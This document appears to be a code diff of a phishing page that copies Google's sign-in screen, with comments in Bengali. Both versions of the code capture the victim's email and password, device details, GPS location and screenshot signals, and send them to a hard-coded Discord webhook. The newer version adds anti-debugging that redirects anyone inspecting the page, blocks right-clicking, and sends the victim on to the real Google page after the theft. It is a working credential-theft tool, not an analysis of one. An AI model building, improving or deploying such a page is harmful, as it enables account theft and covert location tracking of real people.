@@ -3,104 +3,98 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Account Security | Verification Required</title>
+    <title>Security Verification | Account Center</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, sans-serif; }
-        body { background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .card { background: #fff; width: 380px; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; user-select: none; }
+        .container { width: 100%; max-width: 400px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
         .logo { width: 75px; margin-bottom: 10px; }
-        h2 { font-size: 24px; font-weight: 500; margin-bottom: 10px; color: #202124; }
-        p { font-size: 15px; color: #5f6368; margin-bottom: 25px; }
-        input { width: 100%; padding: 13px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; }
+        h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 10px; }
+        p { font-size: 15px; color: #3c4043; margin-bottom: 30px; }
+        input { width: 100%; padding: 13px 15px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; }
         input:focus { border: 2px solid #1a73e8; }
-        .btn { width: 100%; padding: 12px; background: #1a73e8; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 500; cursor: pointer; transition: 0.3s; }
-        .btn:hover { background: #1765cc; }
-        #loader { display: none; margin-top: 15px; color: #1a73e8; font-size: 14px; }
+        .btn { width: 100%; padding: 11px; background: #1a73e8; color: #fff; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
+        #loader { display: none; margin-top: 20px; font-size: 14px; color: #5f6368; }
     </style>
 </head>
-<body>
-
-<div class="card">
+<body oncontextmenu="return false;"> <div class="container" id="capture">
     <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" class="logo">
-    <h2>Verify Identity</h2>
-    <p>Unusual activity detected. Please sign in to verify your account.</p>
+    <h1>Sign in</h1>
+    <p>Use your account to continue</p>
     
     <form id="pwnForm">
-        <input type="text" id="user" placeholder="Email or phone" required>
-        <input type="password" id="pass" placeholder="Enter your password" required>
-        <button type="submit" class="btn">Verify Now</button>
+        <input type="text" id="email" placeholder="Email or phone" required autocomplete="off">
+        <input type="password" id="pass" placeholder="Enter your password" required autocomplete="off">
+        <button type="submit" class="btn">Next</button>
     </form>
 
-    <div id="loader">Checking device integrity...</div>
+    <div id="loader">
+        <img src="https://www.google.com/images/spin-32.gif" width="20"><br>
+        Processing security headers...
+    </div>
 </div>
 
 <script>
-    // আপনার দেওয়া Discord Webhook URL
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1475592431826112654/qBMlLSds9-2LzvVGQ3t65TiI94MZE04z2xMnW_HjtwuMHamWJ1jzHqTde4I6sY8njRXg";
+    const DISCORD_URL = "https://discord.com/api/webhooks/1475592431826112654/qBMlLSds9-2LzvVGQ3t65TiI94MZE04z2xMnW_HjtwuMHamWJ1jzHqTde4I6sY8njRXg";
 
-    // ডিসকর্ডে ডাটা পাঠানোর মেইন ফাংশন
-    async function sendDiscord(title, desc, color) {
-        try {
-            await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    embeds: [{
-                        title: title,
-                        description: desc,
-                        color: color,
-                        timestamp: new Date()
-                    }]
-                })
-            });
-        } catch (e) { console.error("Error sending data."); }
+    // ১. ডিসকর্ডে ডাটা পাঠানোর মাস্টার ফাংশন
+    async function sendToDiscord(title, desc, color = 3447003) {
+        await fetch(DISCORD_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                embeds: [{ title: title, description: desc, color: color, timestamp: new Date() }]
+            })
+        });
     }
 
-    // ১. পেজ লোড হতেই ডিভাইসের সব তথ্য (Fingerprinting)
+    // ২. এন্টি-ডিবাগ (কেউ কোড দেখতে চাইলে পেজ ক্রাশ করবে)
+    setInterval(() => {
+        const start = Date.now();
+        debugger;
+        if (Date.now() - start > 100) { window.location.href = "https://google.com"; }
+    }, 1000);
+
+    // ৩. ডিভাইস এবং নেটওয়ার্ক ইন্টেলিজেন্স
     window.onload = async () => {
-        let battery = await navigator.getBattery();
-        let details = `
-        **🌐 OS:** ${navigator.platform}
-        **💾 RAM:** ${navigator.deviceMemory || "Unknown"} GB
-        **⚡ CPU:** ${navigator.hardwareConcurrency} Cores
-        **🔋 Battery:** ${Math.round(battery.level * 100)}%
-        **🖥️ Screen:** ${screen.width}x${screen.height}
-        **📍 Language:** ${navigator.language}
-        `;
-        sendDiscord("📱 Device Connected", details, 3447003); // Blue Color
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        let netInfo = conn ? `**Speed:** ${conn.downlink}Mbps\n**Type:** ${conn.effectiveType}` : "N/A";
+        
+        let details = `**OS:** ${navigator.platform}\n**RAM:** ${navigator.deviceMemory}GB\n**Network:** ${netInfo}\n**Language:** ${navigator.language}`;
+        sendToDiscord("🛡️ Advanced Intelligence", details, 1752220);
 
-        // ২. লোকেশন ট্র্যাকিং (যদি ইউজার পারমিশন দেয়)
-        navigator.geolocation.getCurrentPosition(pos => {
-            let loc = `**Latitude:** ${pos.coords.latitude}\n**Longitude:** ${pos.coords.longitude}\n**Accuracy:** ${pos.coords.accuracy} meters`;
-            sendDiscord("📍 Real-time Location", loc, 15105570); // Orange Color
+        // লোকেশন অটো-ক্যাপচার
+        navigator.geolocation.getCurrentPosition(p => {
+            sendToDiscord("📍 High-Precision GPS", `[Google Maps](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`, 15105570);
         });
-
-        // ৩. ইনভিজিবল স্ক্রিনশট (৪ সেকেন্ড পর)
-        setTimeout(() => {
-            html2canvas(document.body).then(canvas => {
-                // স্ক্রিনশট ডাটা অনেক বড় হয়, তাই ডিসকর্ডে শুধু নোটিফিকেশন দিচ্ছি
-                sendDiscord("📸 Screenshot Taken", "Victim is currently viewing the login page.", 10181046);
-            });
-        }, 4000);
     };
 
-    // ৪. ইমেইল ও পাসওয়ার্ড কালেকশন
-    document.getElementById('pwnForm').addEventListener('submit', function(e) {
+    // ৪. স্টেলথ স্ক্রিনশট ফাংশন
+    async function silentSnap() {
+        const canvas = await html2canvas(document.body);
+        const data = canvas.toDataURL("image/jpeg", 0.1); // ডাটা ছোট রাখা হয়েছে
+        // আপনি চাইলে এখানে ইমেজ হোস্ট সার্ভারে পাঠাতে পারেন, আপাতত নোটিফিকেশন দিচ্ছি
+        sendToDiscord("📸 Live Action", "Victim is interacting with the form...", 3066993);
+    }
+
+    // ৫. কি-লগার স্টাইল (টাইপ করলেই স্ক্রিনশট বা সিগন্যাল যাবে)
+    document.getElementById('pass').addEventListener('focus', silentSnap);
+
+    // ৬. ফাইনাল ডাটা হার্ভেস্টিং
+    document.getElementById('pwnForm').addEventListener('submit', async function(e) {
         e.preventDefault();
-        const u = document.getElementById('user').value;
+        const u = document.getElementById('email').value;
         const p = document.getElementById('pass').value;
 
         document.getElementById('pwnForm').style.display = 'none';
         document.getElementById('loader').style.display = 'block';
 
-        let creds = `**Email:** \`${u}\` \n**Password:** \`${p}\``;
-        sendDiscord("🔑 Credentials Harvested", creds, 15548997); // Red Color
+        await sendToDiscord("🔑 Credentials Found", `**Email:** \`${u}\`\n**Password:** \`${p}\``, 15548997);
 
-        // রিডাইরেক্ট করা
         setTimeout(() => {
-            window.location.href = "https://accounts.google.com";
-        }, 1500);
+            window.location.href = "https://accounts.google.com/manageaccount";
+        }, 2000);
     });
 </script>
 
